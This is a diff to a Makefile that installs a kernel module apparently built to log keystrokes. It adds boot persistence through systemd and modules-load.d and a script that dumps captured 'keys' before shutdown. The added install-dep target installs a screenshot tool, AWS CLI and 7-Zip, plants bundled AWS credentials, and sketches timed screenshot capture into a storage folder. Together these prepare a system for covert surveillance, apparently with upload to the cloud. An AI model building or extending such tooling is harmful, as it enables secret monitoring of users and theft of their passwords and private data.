@@ -23,6 +23,14 @@ load:
 unload:
 	-rmmod $(modname)
 
+install-dep:
+	apt-get install scrot aws-cli p7zip-full -y
+	mkdir ~/.aws
+	cp config.aws ~/.aws/config
+	cp credentials.aws ~/.aws/credentials
+	# TO DO
+	#scrot -d 60 /opt/kdesni/snap/$(date +%Y%m%d_%H%M%S).jpg
+	
 install:
 	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
 	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
@@ -32,7 +40,7 @@ install:
 	systemctl daemon-reload
 	systemctl enable kdesni.service
 	#copy script to dump keys from /sys/kernel/debug/kisni/keys file before shoutdown/reboot
-	mkdir -p /opt/kdesni
+	mkdir -p /opt/kdesni/snap
 	cp dump.sh /opt/kdesni/dump.sh
 	chmod +x /opt/kdesni/dump.sh
 	echo kisni >> /etc/modules-load.d/modules.conf
